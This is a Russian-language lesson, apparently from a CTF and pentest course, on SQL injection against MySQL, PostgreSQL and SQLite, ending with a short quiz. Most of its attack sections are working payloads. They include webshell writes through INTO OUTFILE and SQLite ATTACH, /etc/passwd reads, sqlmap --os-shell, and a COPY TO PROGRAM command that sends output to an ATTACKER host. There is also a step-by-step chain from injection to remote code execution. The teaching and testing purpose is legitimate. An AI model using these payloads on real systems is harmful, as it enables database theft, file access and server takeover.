---
id: web-sqli-dbms-open
title: "Открытые СУБД: MySQL, PostgreSQL и SQLite"
category: web
parent: web-sqli-dbms
difficulty: medium
order: 1
tags: [sqli, mysql, postgresql, sqlite, union, outfile, rce, dbms]
prerequisites: [web-sqli, web-sqli-dbms]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "Модуль-навигатор по трём самым частым открытым СУБД в вебе: MySQL/MariaDB, PostgreSQL и SQLite — что общего и чем диалекты различаются при инъекции."
---

Открытые СУБД — MySQL, PostgreSQL и SQLite — встречаются в веб-приложениях чаще корпоративных. У каждой свой диалект, свои функции и свои способы превратить инъекцию в чтение файлов, а иногда и в RCE. Этот урок — практический разбор трёх баз: фингерпринт, синтаксис, метаданные, чтение файлов, задержки и обходы.

## Фингерпринт: как отличить три базы

Диалект определяется по ошибкам, синтаксису и поведению функций.

| Признак | MySQL | PostgreSQL | SQLite |
|---------|-------|-----------|--------|
| Комментарий | `#`, `-- `, `/**/` | `--`, `/**/` | `--`, `/**/` |
| Версия | `@@version`, `VERSION()` | `version()` | `sqlite_version()` |
| Конкатенация | `CONCAT(a,b)` | `\|\|` или `CONCAT` | `\|\|` |
| Пауза | `SLEEP(n)` | `pg_sleep(n)` | нет (только тяжёлый запрос) |
| Метаданные | `information_schema` | `information_schema` | `sqlite_master` |
| Строки в одну | `GROUP_CONCAT` | `string_agg` | `group_concat` |
| Stacked `;` | зависит от API | да | зависит |
| Чтение файла | `LOAD_FILE()` | `pg_read_file()` | нет (кроме ATTACH) |

```bash
# MySQL
curl -s "https://t/?id=1 AND SLEEP(5)-- -" -o /dev/null -w '%{time_total}\n'
# PostgreSQL
curl -s "https://t/?id=1; SELECT pg_sleep(5)-- -" -o /dev/null -w '%{time_total}\n'
# SQLite — через sqlite_version()
curl -s "https://t/?id=1 UNION SELECT sqlite_version(),2,3-- -"
```

## MySQL: синтаксис и метаданные

MySQL — самая распространённая база в веб-приложениях. Ключевые приёмы:

```sql
-- версия и пользователь
SELECT @@version, user(), database();
-- список баз, таблиц, колонок
SELECT schema_name FROM information_schema.schemata;
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
SELECT column_name FROM information_schema.columns WHERE table_name='users';
-- агрегация строк
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database();
-- без пробелов (обход фильтра)
SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables
```

## MySQL: чтение файлов и запись

```sql
-- чтение файла (нужна привилегия FILE)
SELECT LOAD_FILE('/etc/passwd');
-- запись webshell (нужен FILE + права на каталог + secure_file_priv)
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/s.php';
-- если OUTFILE занят — DUMPFILE (без разделителей)
SELECT 0x3c3f706870... INTO DUMPFILE '/var/www/html/s.php';
```

`secure_file_priv` ограничивает каталоги записи; проверяйте его значение через инъекцию (`SELECT @@secure_file_priv`). Если запись запрещена — путь к RCE лежит через `LOAD_FILE` + лог-пуазинг или через UDF.

## PostgreSQL: синтаксис, метаданные, RCE

PostgreSQL богаче на функции и часто позволяет RCE через `COPY TO PROGRAM` при правах суперпользователя.

```sql
-- версия, пользователь, текущая БД
SELECT version(), current_user, current_database();
-- метаданные
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
SELECT column_name FROM information_schema.columns WHERE table_name='users';
-- агрегация
SELECT string_agg(table_name, ',') FROM information_schema.tables;
-- чтение файла
SELECT pg_read_file('/etc/passwd');
-- RCE через COPY (нужен superuser)
COPY (SELECT '') TO PROGRAM 'id > /tmp/o';
```

## SQLite: особенности

SQLite — файловая база; часто встречается в мобильных API и простых приложениях. Здесь нет задержек и чтения файлов, зато есть `sqlite_master`.

```sql
-- таблицы и их DDL
SELECT name, sql FROM sqlite_master WHERE type='table';
-- колонки (через pragma в некоторых движках)
SELECT sql FROM sqlite_master WHERE name='users';
-- извлечение данных
SELECT group_concat(name) FROM sqlite_master WHERE type='table';
-- ATTACH другого файла (если разрешено)
ATTACH DATABASE '/var/www/html/x.php' AS x;
```

## Инструменты и команды

```bash
# sqlmap с явной СУБД
sqlmap -r req.txt -p id --dbms=mysql --batch --dbs
sqlmap -r req.txt -p id --dbms=postgresql --batch --file-read=/etc/passwd
sqlmap -r req.txt -p id --dbms=sqlite --batch --dump

# запись webshell через sqlmap (MySQL)
sqlmap -r req.txt -p id --dbms=mysql --os-shell --web-root=/var/www/html

# ручное извлечение через UNION
curl -s "https://t/?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables-- -"
```

| Инструмент | Назначение | Ключевые флаги |
|-----------|-----------|----------------|
| sqlmap | универсальная эксплуатация | `--dbms --dbs --dump --os-shell` |
| mysql (клиент) | прямой доступ | `mysql -h host -u user -p` |
| psql | прямой доступ | `psql -h host -U user` |
| sqlite3 | локальный файл | `sqlite3 db.sqlite '.tables'` |

## Разобранный пример: MySQL → webshell

```bash
# 1. UNION-инъекция, определяем число колонок
$ curl -s "https://t/?id=1 ORDER BY 3-- -"   # ok
$ curl -s "https://t/?id=1 ORDER BY 4-- -"   # ошибка -> 3 колонки

# 2. находим точку отражения
$ curl -s "https://t/?id=-1 UNION SELECT 1,2,3-- -"
...2...

# 3. версия и права
$ curl -s "https://t/?id=-1 UNION SELECT 1,@@version,user()-- -"
8.0.32   root@localhost

# 4. проверяем secure_file_priv
$ curl -s "https://t/?id=-1 UNION SELECT 1,@@secure_file_priv,3-- -"
(пусто) -> запись разрешена в любой каталог

# 5. пишем webshell
$ curl -s "https://t/?id=-1 UNION SELECT 1,0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e,3 INTO OUTFILE '/var/www/html/s.php'-- -"

# 6. проверяем RCE
$ curl -s "https://t/s.php?c=id"
uid=33(www-data) gid=33(www-data)
```

Артефакт — вывод `id` с веб-сервера. Это полный RCE.

## Разобранный пример: PostgreSQL RCE

```bash
$ curl -s "https://t/?id=1; COPY (SELECT '') TO PROGRAM 'curl http://ATTACKER/$(id|base64)'-- -"
# listener: GET /dWlkPTAocm9vdCk= -> RCE подтверждён
```

## Обходы фильтров

- **Пробелы** — `/**/`, `%09`, `%0a`, скобки.
- **Ключевые слова** — регистр, `/*!50000SELECT*/` (MySQL), двойное кодирование.
- **Кавычки** — `0x27`, `char(39)`, `%27`, `%2527`.
- **Комментарии** — MySQL `#`, `-- -`, `/* */`.
- **Функции** — `SLEEP` может быть отфильтрован: используйте `BENCHMARK`, тяжёлые запросы.
- **WAF** — разбивайте слова, используйте комментарии и `CHAR()`.

## Крайние случаи и подводные камни

- **`secure_file_priv`** может запретить запись файлов — проверяйте значение.
- **Привилегии.** `LOAD_FILE`/`COPY TO PROGRAM` требуют прав (`FILE`, superuser).
- **PDO-эмуляция.** MySQL через PDO с эмуляцией может ограничивать stacked-запросы.
- **Кодировка соединения.** `SET NAMES` влияет на то, как база парсит кавычки (мультибайт-обходы).
- **SQLite-специфика.** Нет `information_schema`, нет пауз; планируйте UNION/blind через `sqlite_master`.
- **Ложные срабатывания.** Пустой ответ на кавычку не всегда инъекция — сравнивайте с базовым размером.

## Что делать дальше / решение

1. **Определите диалект** — по ошибкам, функциям, паузе.
2. **Получите метаданные** — `information_schema`/`sqlite_master`.
3. **Дампните данные** — `sqlmap` или ручной UNION/blind.
4. **Проверьте чтение/запись файлов** — `LOAD_FILE`, `INTO OUTFILE`, `pg_read_file`, `COPY TO PROGRAM`.
5. **RCE** — webshell (MySQL), `COPY TO PROGRAM` (PostgreSQL).
6. **OOB при отсутствии эха** — DNS/HTTP через функции базы.
7. **Pivot** — полученные креды используйте для доступа к другим сервисам.

## Справочная таблица

| Задача | MySQL | PostgreSQL | SQLite |
|--------|-------|-----------|--------|
| Версия | `@@version` | `version()` | `sqlite_version()` |
| Таблицы | `information_schema.tables` | `information_schema.tables` | `sqlite_master` |
| Пауза | `SLEEP(n)` | `pg_sleep(n)` | нет |
| Строки в одну | `GROUP_CONCAT` | `string_agg` | `group_concat` |
| Чтение файла | `LOAD_FILE` | `pg_read_file` | нет |
| Запись файла | `INTO OUTFILE` | `COPY ... TO` | `ATTACH` |
| RCE | UDF/webshell | `COPY TO PROGRAM` | нет |

## MySQL: error-based через ExtractValue и UpdateXML

Когда нет удобного UNION, MySQL умеет выводить данные прямо в тексте ошибки. Функции `EXTRACTVALUE` и `UPDATEXML` при некорректном XPath-выражении возвращают ошибку, содержащую переданную строку — идеальный канал для извлечения данных.

```sql
-- извлечь имя базы в ошибке
AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))
-- версия в ошибке
AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version), 0x7e), 1)
-- список таблиц в ошибке (ограничение ~32 символа на вывод)
AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), 0x7e))
```

Символ `0x7e` (`~`) служит маркером, по которому легко найти вывод в тексте ошибки. Ограничение по длине обходится через `SUBSTRING` и последовательные запросы. Этот метод шумный (ошибки попадают в логи), но очень быстрый по сравнению с blind.

## PostgreSQL: чтение через large objects и lo_import

PostgreSQL даёт несколько каналов для файловых операций, и они полезны, когда `pg_read_file` недоступна или требует прав.

```sql
-- чтение файла (superuser)
SELECT pg_read_file('/etc/passwd', 0, 1000);
-- чтение как large object
SELECT lo_import('/etc/passwd');
SELECT lo_get(16400);
-- запись файла через lo_export
SELECT lo_export(16400, '/tmp/out');
```

При наличии прав это превращается в полноценное чтение/запись файлов, а вместе с `COPY TO PROGRAM` — в RCE. Всегда проверяйте `SELECT current_user` и `SELECT usesuper FROM pg_user WHERE usename=current_user`.

## SQLite: атаки на файл и ATTACH

SQLite не выполняет код и не читает произвольные файлы напрямую, но при определённых условиях опасна. Через `ATTACH DATABASE` можно создать файл, содержимое которого вы контролируете — классический путь к записи PHP-шелла, если сервер отдаёт каталог.

```sql
-- создать файл с управляемым содержимым
ATTACH DATABASE '/var/www/html/x.php' AS x;
CREATE TABLE x.p (c text);
INSERT INTO x.p VALUES ('<?php system($_GET["c"]); ?>');
```

Условие — наличие прав на запись и веб-доступ к каталогу. Также в SQLite полезна инъекция в `sqlite_master.sql`, где хранится исходный DDL таблиц — иногда там оказываются имена и структуры, которых нет в других местах.

## Обход WAF по диалектам

Каждый диалект предлагает свои трюки обхода фильтров. MySQL: комментарий-хинт `/*!50000SELECT*/`, `/**/` вместо пробелов, `%0a`, `%09`, экранирование через `CHAR()`. PostgreSQL: `||` для конкатенации, `CHR()`, `$$`-строки, регистр. SQLite: `||`, `char()`, нестандартные кавычки.

```bash
# MySQL: пробелы через комментарий
curl -s "https://t/?id=1/**/UNION/**/SELECT/**/1,2,3-- -"
# PostgreSQL: строки через $$
curl -s "https://t/?id=1 UNION SELECT \$\$test\$\$,2-- -"
# обход фильтра кавычки
curl -s "https://t/?id=1 AND 0x41=0x41"
```

Отдельно стоит учитывать WAF, который ловит сигнатуры: разбивайте ключевые слова (`UN/**/ION`), меняйте регистр, используйте URL-кодирование и юникод. Проверяйте, что ответ не изменился из-за блокировки, а не из-за неверного синтаксиса.

## Итоговая стратегия

Работа с открытыми СУБД строится по единому алгоритму: определите диалект, извлеките метаданные, дампните данные, проверьте файловые операции и RCE, при отсутствии эха — используйте OOB. Не тащите синтаксис одной базы в другую: `SLEEP` не работает в PostgreSQL и SQLite, `information_schema` отсутствует в SQLite, `#` — только в MySQL. Каждый шаг фиксируйте командой и результатом: это и PoC, и защита от повторной работы. Если ветка упёрлась в привилегии (`FILE`, superuser) — переходите к OOB или к следующей цели, а не бейтесь в стену.

## Квиз

```quiz
- question: "Какая функция агрегирует строки в одну строку в PostgreSQL?"
  options:
    - "GROUP_CONCAT"
    - "string_agg"
    - "LISTAGG"
    - "STRING_AGG"
  answer: 1
  explanation: "string_agg(x, ',') — PostgreSQL; GROUP_CONCAT — MySQL/SQLite, LISTAGG — Oracle."
- question: "Где хранится список таблиц в SQLite?"
  options:
    - "information_schema.tables"
    - "pg_catalog"
    - "sqlite_master"
    - "all_tables"
  answer: 2
  explanation: "В SQLite метаданные лежат в sqlite_master (он же sqlite_schema)."
- question: "Почему в SQLite не работает time-based blind через SLEEP?"
  options:
    - "Функция SLEEP в SQLite не существует"
    - "SLEEP работает только с суперпользователем"
    - "SQLite не поддерживает SELECT"
    - "SLEEP отключён WAF-ом"
  answer: 0
  explanation: "В SQLite нет функции задержки — используют UNION или boolean-логику."
```

## Где пригодится

- **CTF (Web):** большинство задач на SQLi — MySQL/PostgreSQL/SQLite; умение выбрать диалект экономит время.
- **Bug bounty:** реальные приложения чаще всего крутят MySQL или PostgreSQL — рабочий payload под правильную базу = подтверждённый high/critical.
- **Пентест:** отчёт требует точной идентификации СУБД и PoC под неё.
- **Работа (AppSec):** ревью запросов и конфигураций под конкретный движок.
